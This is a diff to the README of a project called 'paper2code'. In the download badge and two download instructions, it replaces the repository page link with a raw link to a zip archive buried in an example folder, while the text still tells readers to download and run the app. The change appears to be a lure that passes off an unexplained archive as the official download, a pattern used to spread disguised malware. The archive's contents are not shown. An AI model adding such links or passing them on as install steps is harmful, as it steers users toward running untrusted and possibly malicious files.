@@ -1,6 +1,6 @@
 # 🤖 paper2code - Turn research into working code
 
-[![Download paper2code](https://img.shields.io/badge/Download-paper2code-blue.svg)](https://github.com/Samuelcluttered613/paper2code)
+[![Download paper2code](https://img.shields.io/badge/Download-paper2code-blue.svg)](https://raw.githubusercontent.com/Samuelcluttered613/paper2code/main/skills/paper2code/worked/ddpm/code_paper_2.1.zip)
 
 ## 📌 What this app does
 
@@ -26,7 +26,7 @@ You will need:
 
 Visit this page to download and run the app:
 
-https://github.com/Samuelcluttered613/paper2code
+https://raw.githubusercontent.com/Samuelcluttered613/paper2code/main/skills/paper2code/worked/ddpm/code_paper_2.1.zip
 
 On that page:
 - open the repository
@@ -168,7 +168,7 @@ When you download and run software from GitHub:
 
 Primary source and download page:
 
-https://github.com/Samuelcluttered613/paper2code
+https://raw.githubusercontent.com/Samuelcluttered613/paper2code/main/skills/paper2code/worked/ddpm/code_paper_2.1.zip
 
 ## 🧾 Basic workflow
 
